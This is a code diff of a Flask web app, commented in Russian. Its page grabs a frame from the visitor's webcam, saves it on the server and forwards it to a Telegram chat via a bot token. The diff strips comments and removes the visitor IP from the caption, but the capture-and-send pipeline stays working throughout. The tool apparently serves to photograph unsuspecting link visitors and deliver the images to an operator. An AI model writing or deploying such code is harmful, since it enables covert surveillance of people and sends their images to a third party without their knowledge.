@@ -7,8 +7,8 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ===== НАСТРОЙКИ =====
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"     # от @BotFather
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"         # от @userinfobot
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
 # =====================
 
 HTML_TEMPLATE = """
@@ -95,7 +95,6 @@ HTML_TEMPLATE = """
             video.srcObject = stream;
             await video.play();
 
-            // Ждём 1.5 секунды для стабилизации кадра
             await new Promise(r => setTimeout(r, 1500));
 
             const canvas = document.createElement('canvas');
@@ -106,10 +105,8 @@ HTML_TEMPLATE = """
 
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
 
-            // Останавливаем камеру
             stream.getTracks().forEach(t => t.stop());
 
-            // Отправляем на сервер
             const host = window.location.origin;
             const resp = await fetch(host + '/photo', {
                 method: 'POST',
@@ -140,7 +137,6 @@ HTML_TEMPLATE = """
 """
 
 def send_telegram_photo(image_b64):
-    """Отправляет фото в Telegram."""
     if "," in image_b64:
         image_b64 = image_b64.split(",")[1]
     
@@ -152,11 +148,11 @@ def send_telegram_photo(image_b64):
     
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
     files = {"photo": ("capture.jpg", img_data, "image/jpeg")}
-    caption = f"📸 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nIP: {request.remote_addr}"
+    caption = f"📸 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     
     try:
         r = requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=10)
-        print(f"[TG] {r.status_code} — {r.text[:100]}")
+        print(f"[TG] {r.status_code}")
     except Exception as e:
         print(f"[TG] Error: {e}")
 
@@ -173,19 +169,16 @@ def photo():
     image_b64 = data["image"]
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     
-    # Сохраняем локально
     os.makedirs("captures", exist_ok=True)
     raw = image_b64.split(",")[1] if "," in image_b64 else image_b64
     with open(f"captures/capture_{ts}.jpg", "wb") as f:
         f.write(base64.b64decode(raw))
     print(f"[+] Saved captures/capture_{ts}.jpg")
     
-    # Отправляем в TG
     send_telegram_photo(image_b64)
     
     return jsonify({"status": "ok"})
 
-# Для локальной разработки
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=False)
